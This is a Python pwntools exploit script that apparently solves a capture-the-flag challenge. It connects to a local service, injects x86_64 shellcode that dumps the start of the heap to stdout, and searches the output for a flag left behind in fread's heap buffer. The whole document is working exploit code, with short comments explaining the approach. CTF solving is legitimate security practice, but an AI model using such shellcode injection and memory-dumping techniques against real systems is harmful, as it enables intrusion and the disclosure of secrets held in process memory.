#!/usr/bin/env python3

# the memory where the flag was read into is truly unreadable now,
# but fread reads through a buffer on heap, flag can be read from there
# finding where this buffer was precisely might not be the easiest,
# but this is a small application, so it's possible to just read the beginning of heap
# and the flag should be there somewhere

from pwn import *

context.update(arch='x86_64')

target = remote('127.0.0.1', 1337)

shellcode = asm(
'''
    mov rdi, 1; // fd=stdout
    mov rsi, [rbp-0x28]; // rsi=some heap address
    and rsi, 0xfffffffffffff000; // this should be enough to find start of heap
    mov rdx, 0x1000; // count=0x1000
    mov rax, 1; // write(stdout, heap, 0x1000)
    syscall;
    mov rax, 60; // exit(whatever)
    syscall;
'''
)

target.send(shellcode)
mem = target.read(0x1200)

print(mem)
match = re.search(b'1753c{.*}', mem)

if match:
    print(match[0])
else:
    print('flag not found o_o')

target.interactive()
